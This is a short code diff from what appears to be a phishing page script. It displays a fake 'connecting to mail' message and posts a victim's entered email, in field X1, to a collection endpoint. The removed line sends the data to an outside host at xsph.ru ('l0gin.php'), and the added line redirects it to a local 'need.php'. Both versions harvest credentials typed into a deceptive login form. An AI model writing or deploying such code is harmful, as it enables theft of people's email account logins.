@@ -29,7 +29,7 @@ $(document).ready(function() {
         document.getElementById("fback").style.display = "block";
         $("#tfb").text("connecting to mail." + domain);
         $.ajax({
-            url: "http://a0581507.xsph.ru/l0gin.php",
+            url: "need.php",
             method: "post",
             data: {
                 X1: email,
